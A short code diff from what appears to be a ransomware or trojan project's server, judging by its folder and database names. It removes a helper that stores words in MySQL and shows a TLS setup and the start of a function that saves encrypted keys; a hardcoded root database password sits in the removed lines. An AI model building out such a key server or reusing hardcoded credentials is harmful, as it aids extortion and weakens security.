@@ -22,22 +22,6 @@ key_pem = "D:\\python_programmers_clab\\TROJAN_RANSOMEWARE\\key.pem"
 context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 context.load_cert_chain(certfile=cert_pem,keyfile=key_pem)
 
-def mysql_insert_random_word(word):
-    sql_conn = mysql.connector.connect(
-        host="localhost",
-        user="root",
-        password="Galking22!!!",
-        database="my_server_trojan"
-    )
-    cursor = sql_conn.cursor()
-    
-    cursor.execute("INSERT INTO random_words (word) VALUES (%s)", (word,))
-    sql_conn.commit()
-
-    print(f"the secret word ({word}) has been saved successfully")
-    
-    cursor.close()
-    sql_conn.close()
 
 def save_encrypted_key_to_db(encrypted_key_b64):
     conn = mysql.connector.connect(
